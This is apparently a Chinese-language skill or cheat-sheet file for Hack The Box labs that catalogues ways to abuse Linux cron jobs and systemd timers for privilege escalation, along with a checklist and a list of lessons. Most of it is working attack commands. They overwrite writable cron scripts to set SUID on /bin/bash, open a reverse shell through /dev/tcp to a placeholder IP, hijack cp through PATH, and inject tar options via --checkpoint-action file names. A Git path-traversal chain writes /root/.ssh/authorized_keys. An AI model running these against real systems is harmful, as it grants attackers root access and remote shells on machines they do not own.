---
name: 'cron-privesc-patterns'
description: 'Cron Job Abuse 提权模式库：可写脚本/PATH劫持/通配符注入/日志投毒/@reboot + 🆕Git Template Sync路径穿越。来自20+台HTB机器统计。'
disable-model-invocation: true
metadata: { domain: linux, tier: T2 }
---

# Cron Job Abuse 提权模式库

> 来自 20+ 台 HTB 机器统计：Easy 10台 + Medium 11台 + Hard/Insane 多台。是最常见的 Linux 提权向量之一。

## 模式 1: 可写脚本 (Writable Script) — 最常见

```bash
# 发现
ls -la /etc/cron.* 2>/dev/null
cat /etc/crontab
crontab -l
systemctl list-timers --all
ps aux | grep cron

# 检查可写性
find /etc/cron* -writable 2>/dev/null
find /var/spool/cron -writable 2>/dev/null

# 利用
echo '#!/bin/bash' > /path/to/cron_script.sh
echo 'chmod +s /bin/bash' >> /path/to/cron_script.sh
# 或反弹 shell:
echo 'bash -i >& /dev/tcp/IP/PORT 0>&1' >> /path/to/cron_script.sh
```text

## 模式 2: PATH Hijack（PATH 劫持）

```bash
# cron 脚本用相对路径调用命令？→ PATH 劫持
cat /etc/crontab | grep -v '^#'
# script.sh 里用了: cp /tmp/foo /var/backup/
# 劫持 cp
echo '#!/bin/bash' > /tmp/cp
echo 'chmod +s /bin/bash' >> /tmp/cp
chmod +x /tmp/cp
```text

## 模式 3: 通配符注入 (Wildcard Injection)

```bash
# cron 脚本用了 tar/rsync/chown 等带通配符的命令
touch '--checkpoint=1'
touch '--checkpoint-action=exec=bash shell.sh'
# tar cf ... * 时, * 展开为文件名 → tar 参数注入
```text

## 模式 4: Cron + 日志/邮件投毒

```bash
# cron 脚本读取日志或邮件 → 投毒输入
echo "ERROR; /bin/bash -c '...'" >> /var/log/app.log
```text

## 模式 5: @reboot Cron（重启触发）

```bash
crontab -l | grep @reboot
# 如果指向可写脚本 → 写入 → 等重启
```text

## 🆕 模式 6: Git Template Sync 路径穿越（来源 Nexus）

```bash
# 特征: systemd timer 定期从 Git repo 同步文件
systemctl list-timers --all | grep -i "git\|sync\|template"

# 审计关键点:
# 1. timer 以什么用户运行？（root?）
# 2. 脚本是否用 os.path.join() 拼接 git ls-tree 输出的路径？
# 3. 攻击者能否控制 Git repo？（能 push？能创建 template repo？）
```text

**利用链**:
1. 创建 Gitea template 仓库
2. 手工构造 Git 对象含 `..` 路径穿越（绕过 git 前端校验）
3. Push → timer 触发 → `os.path.join` 规范化 `..` → 写任意文件（如 `/root/.ssh/authorized_keys`）

详见 git-object-path-traversal

### HTB 案例：Nexus
| 组件 | 详情 |
|------|------|
| Timer | `gitea-template-sync.timer`（每分钟，root） |
| 脚本 | `/etc/gitea/template-sync.py` |
| 漏洞点 | `os.path.join(stage_path, filepath)` — filepath 来自 `git ls-tree -r` |
| 利用 | 手工构造 Git tree entry `..` → push → timer 写 `/root/.ssh/authorized_keys` |

## 快速检查清单

```bash
[ ] cat /etc/crontab; ls -la /etc/cron.*/
[ ] crontab -l 2>/dev/null; ls /var/spool/cron/crontabs/ 2>/dev/null
[ ] systemctl list-timers --all 2>/dev/null
[ ] 每个 cron 脚本的权限: ls -la <script_path>
[ ] 脚本内容审计: cat <script> → 相对路径？→ PATH hijack
[ ] 脚本内容: tar/rsync/chown + * → 通配符注入
[ ] 脚本读取的输入文件: 可写？→ 投毒
[ ] /tmp 下的脚本: 竞态条件？→ 替换
[ ] 🆕 脚本用了 git ls-tree？→ 路径穿越
[ ] 🆕 脚本用了 os.path.join 且第二个参数来自外部？→ 路径穿越
```text

## 教训

1. **Cron 是 Linux 提权的第二大门（仅次于 sudo）** — 每台必查
2. **不要只看 /etc/crontab** — 还有 /etc/cron.d/, /var/spool/cron, systemd-timers, incron
3. **相对路径在 cron 脚本中 = 致命** — cron PATH = /usr/bin:/bin 极简
4. **tar/rsync 的通配符展开 = 参数注入原语**
5. 🆕 **os.path.join + git ls-tree = 路径穿越** — Python 规范化路径时 `..` 会被解析
6. 🆕 **Git 对象层无路径校验** — 手工构造 raw object 可绕过 git 前端的路径限制
